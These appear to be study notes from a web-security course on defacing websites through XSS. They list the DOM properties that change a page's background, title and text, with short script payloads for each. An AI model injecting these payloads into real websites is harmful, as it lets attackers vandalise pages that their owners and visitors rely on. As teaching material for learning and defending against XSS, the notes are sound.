# Defacing

Stored XSS being the most critical, while a Refelected and DOM-based being less so

Defacing a website means changing its look for anyone who visits the website.

## Defacement Elements

Three HTML elements are usually utilized to change the main look of a web page:

Background Color document.body.style.background
Background document.body.background
Page Title document.title
Page Text DOM.innerHTML

Changing Background color
<script>document.body.style.background = "#141d2b"</script>

Set an image to the background
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>

Changing Page Title
<script>document.title = 'HackTheBox Academy'</script>

Changing Page Text
document.getElementById("todo").innerHTML = "New Text"
\$("#todo").html('New Text');
document.getElementsByTagName('body')[0].innerHTML = "New Text"

